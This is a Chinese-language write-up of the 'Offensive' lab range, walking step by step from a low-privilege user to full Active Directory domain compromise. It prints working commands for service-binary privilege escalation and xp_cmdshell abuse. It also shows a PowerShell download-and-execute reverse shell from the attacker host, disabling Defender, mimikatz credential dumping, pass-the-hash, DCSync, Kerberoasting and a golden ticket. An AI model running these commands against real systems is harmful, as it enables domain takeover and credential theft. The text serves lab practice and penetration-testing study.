## **前言**

Offensive是国外的一个靶场，要求获取域控权限，且只能使用客户机提供的工具以及powershell，已经拥有192.168.159.10的一个用户权限，工具已经放在主机内。

网络拓扑如下：![](https://image.3001.net/images/20220526/1653531419_628ee31b478ec8eb3ba7e.png!small)  
通过信息搜集，以及知道当前用户为offensive\Alice在域环境offensive中，当前用户不在管理员组中。使用工具包中提供的powerup来进行检查，寻找当前主机的Windows服务漏洞来进行提权。

    
    
    powershell -exec bypass -Command "Import-Module .\PowerUp.ps1;Invoke-AllChecks"

![](https://image.3001.net/images/20220526/1653531492_628ee3640d960040d75c9.png!small)这里发现VulnService.exe是以localsystem权限启动的，这里利用方法是利用powerup写入一个二进制文件，将Alice添加到管理员组：

    
    
    powershell -exec bypass -Command "Import-Module .\PowerUp.ps1;Write-ServiceBinary -ServiceName'VulnService' -UserName'offensive\Alice' -Password 'Passw0rd'"

![](https://image.3001.net/images/20220526/1653531532_628ee38c03e3d908e361a.png!small)将生产的service.exe重命名后放在对应目录下，重启主机后，提取至管理员权限。![](https://image.3001.net/images/20220526/1653531569_628ee3b1b0d7c17612f12.png!small)使用提供的powerview脚本来进行域内信息搜集：

    
    
    Import-Module .\PowerView.ps1        #导入脚本Get-NetDomain               #获取域信息Get-NetDomainController         #获取域控信息Get-NetUser | select name         #获取域内的用户Get-NetGroup | select name         #获取域内的组Get-NetComputer |select name      #获取域内主机的名字

![](https://image.3001.net/images/20220526/1653531621_628ee3e5e37fbc6c79202.png!small)使用powerupsql脚本来进行信息搜集：

    
    
    Import-Module .\PowerUpSQL.ps1        #导入脚本Get-SQLInstanceDomain | Get-SQLConnectionTest     #枚举域内数据库访问情况Get-SQLServerInfo -Instance Offensive-SQL1      #枚举当前服务的详细信息Invoke-SQLAudit -Instance Offensive-SQL1 -verbose #扫描当前服务器可能存在的问题

扫描发现Offensive-SQL1当前登录的用户为Alice：![](https://image.3001.net/images/20220526/1653531674_628ee41a85928d5ef4993.png!small)可以通过xp_cmdshell来执行系统命令：![](https://image.3001.net/images/20220526/1653531716_628ee44442e962f7fed23.png!small)使用提供的Heidisql连接到数据库，执行下述命令，当前用户为域管理员：

    
    
    SELECT * FROM sys.configurations WHERE name='xp_cmdshell' OR name='show advanced options’  EXEC sp_configure 'show advanced options',1RECONFIGUREEXEC sp_configure 'xp_cmdshell',1RECONFIGUREEXEC master..xp_cmdshell 'whoami'

![](https://image.3001.net/images/20220526/1653531761_628ee471dfd7fbacd9931.png!small)  
将提供的反弹shell的脚本拖进HFS中：![](https://image.3001.net/images/20220526/1653531801_628ee49953da622cb5b07.png!small)  
导入powercat脚本来监听443端口，数据库执行系统命令，获得数据库服务器的shell：

    
    
    EXEC master..xp_cmdshell 'powershell "iex(New-Object Net.WebClient).DownloadString(''http://192.168.159.10/Invoke-PowerShellTcpOneLine_443.ps1'')"'

![](https://image.3001.net/images/20220526/1653531849_628ee4c9476ce633ae4b0.png!small)先关闭defender：

    
    
    Set-MpPreference-disablerealtimeMonitoring $true将mimikatz拖进HFS，执行文件下载命令，将mimikatz下载下来,然后运行mimikatz抓取密码certutil -urlcache -f -splithttp://192.168.159.10/mimikatz.exe mimikatz.exe.\mimikatz.exe"privilege::debug" "sekurlsa::logonpasswords" exit

抓取到dbadmin密码的哈希和明文密码：![](https://image.3001.net/images/20220526/1653531960_628ee53818d14566f8ea2.png!small)使用mimikatz进行PTH，报错百度说可能是Win10的某些安全性改进，导致mimikatz无法读取lsass导致的。

    
    
    .\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:dbadmin /domain:offensive.local/ntlm:7fe86e0c585f2b6a2bad86034dac5648 /run:powershell.exe" exit

![](https://image.3001.net/images/20220526/1653532015_628ee56f0b96811690509.png!small)那就在Offensive-SQL1来执行试一下，先开启数据库服务器的远程桌面，使用dbadmin用户登录。![](https://image.3001.net/images/20220526/1653532058_628ee59a70ab2219eca54.png!small)登录到Offensive-SQL1上后，执行命令，成功登录到dc。

    
    
    .\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:dbadmin /domain:offensive.local /ntlm:7fe86e0c585f2b6a2bad86034dac5648 /run:powershell.exe" exitEnter-PSSession -ComputerName dc

![](https://image.3001.net/images/20220526/1653532102_628ee5c639d0d1c464d22.png!small)我们已经获取到域管理员权限，可以利用Dcsync来导出所有域用户的哈希：

    
    
    lsadump::dcsync /domain:offensive.local /all /csv

![](https://image.3001.net/images/20220526/1653532149_628ee5f55d4fd61cd0d5d.png!small)对域管理员Administrator密码的哈希进行破解，密码为Password!![](https://image.3001.net/images/20220526/1653532186_628ee61a31e519fffe4f3.png!small)

 **Kerberoasting**

使用GetUserSPNS脚本来查询域内用户注册的
SPN：![](https://image.3001.net/images/20220526/1653532219_628ee63b72bac5776c5d8.png!small)

    
    
    Add-Type -AssemblyName System.IdentityModel    #请求服务票据New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/Offensive-SQL1:1433"   #列出服务票据Kerberos::list /export   #导出票据

![](https://image.3001.net/images/20220526/1653532272_628ee670009edc260936e.png!small)使用tgsrepcrack脚本对导出的服务票据文件进行离线破解，这里是因为未修改之前的机器密码为Passw0rd!![](https://image.3001.net/images/20220526/1653532326_628ee6a6049f578131c9b.png!small)

 **黄金票据**

前面我们通过Dcsync已经知道了krbtgt的哈希，执行下述命令黄金票据攻击：

    
    
    kerberos::golden /user:Administrator /domain:offensive.local /sid:S-1-5-21-1187620287-4058297830-2395299116 /krbtgt:61d83c569b93bfcd4ca2087011361caa /ptt #misc::cmddir \\dc.offensive.local\c$

![](https://image.3001.net/images/20220526/1653533451_628eeb0b189fbb8e93ef7.png!small)

##  **总结**

通过这个靶场进一步的了解了提权、横向、mssql命令执行、dcsysc、pth等常见渗透攻击方法，以及如何利用当前权限和工具一步步渗透到达域控获取域管理员权限从而接管整个域。

